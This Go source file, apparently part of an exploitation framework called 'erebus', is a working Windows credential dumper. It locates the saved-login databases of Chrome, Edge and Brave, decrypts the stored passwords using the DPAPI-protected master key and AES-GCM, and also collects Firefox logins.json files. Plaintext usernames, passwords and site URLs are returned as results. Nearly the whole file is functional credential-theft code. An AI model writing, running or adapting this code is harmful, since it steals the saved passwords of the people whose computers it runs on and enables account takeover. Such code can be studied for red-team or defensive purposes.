//go:build windows

package creds

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	_ "modernc.org/sqlite"
)

func dumpBrowser(_ context.Context, _ *pb.CredDumpConfig) (*pb.CredDumpResult, error) {
	var creds []*pb.Credential

	localAppData := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")

	chromePaths := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data")},
		{"Edge", filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data")},
		{"Brave", filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")},
	}

	for _, bp := range chromePaths {
		found, err := extractChromiumCreds(bp.name, bp.path)
		if err == nil {
			creds = append(creds, found...)
		}
	}

	firefoxProfiles := filepath.Join(appData, "Mozilla", "Firefox", "Profiles")
	entries, err := os.ReadDir(firefoxProfiles)
	if err == nil {
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			profilePath := filepath.Join(firefoxProfiles, entry.Name())
			loginsPath := filepath.Join(profilePath, "logins.json")
			if _, err := os.Stat(loginsPath); err == nil {
				data, _ := os.ReadFile(loginsPath)
				creds = append(creds, &pb.Credential{
					Type:   "firefox_logins",
					Source: fmt.Sprintf("Firefox (%s)", entry.Name()),
					Value:  string(data),
				})
			}
		}
	}

	if len(creds) == 0 {
		return nil, fmt.Errorf("no browser credentials found")
	}

	return &pb.CredDumpResult{
		Method:      "browser",
		Credentials: creds,
	}, nil
}

func extractChromiumCreds(browser, dbPath string) ([]*pb.Credential, error) {
	if _, err := os.Stat(dbPath); err != nil {
		return nil, err
	}

	userDataDir := filepath.Dir(filepath.Dir(dbPath))
	masterKey, err := chromiumMasterKey(userDataDir)
	if err != nil {
		masterKey = nil
	}

	tmpFile, err := os.CreateTemp("", "logindata-*.db")
	if err != nil {
		return nil, err
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()
	defer os.Remove(tmpPath)

	data, err := os.ReadFile(dbPath)
	if err != nil {
		return nil, err
	}
	if err := os.WriteFile(tmpPath, data, 0600); err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tmpPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []*pb.Credential
	for rows.Next() {
		var url, username string
		var encPassword []byte
		if err := rows.Scan(&url, &username, &encPassword); err != nil {
			continue
		}

		password, err := decryptChromiumPassword(encPassword, masterKey)
		if err != nil {
			password = fmt.Sprintf("<decrypt failed: %v>", err)
		}

		creds = append(creds, &pb.Credential{
			Type:     "browser_password",
			Source:   browser,
			Username: username,
			Domain:   url,
			Value:    password,
		})
	}

	return creds, nil
}

func chromiumMasterKey(userDataDir string) ([]byte, error) {
	localStatePath := filepath.Join(userDataDir, "Local State")
	raw, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var state struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &state); err != nil {
		return nil, err
	}
	if state.OsCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key in Local State")
	}

	encKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(encKey) > 5 && strings.HasPrefix(string(encKey[:5]), "DPAPI") {
		encKey = encKey[5:]
	}
	return dpAPIDecrypt(encKey)
}

func decryptChromiumPassword(enc []byte, masterKey []byte) (string, error) {
	if len(enc) == 0 {
		return "", fmt.Errorf("empty ciphertext")
	}

	if len(enc) >= 3 && (string(enc[:3]) == "v10" || string(enc[:3]) == "v11") {
		if len(masterKey) == 0 {
			return "", fmt.Errorf("master key required for v10/v11 password")
		}
		if len(enc) < 15 {
			return "", fmt.Errorf("ciphertext too short")
		}
		nonce := enc[3:15]
		ciphertext := enc[15:]
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "", err
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", err
		}
		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "", err
		}
		return string(plain), nil
	}

	plain, err := dpAPIDecrypt(enc)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}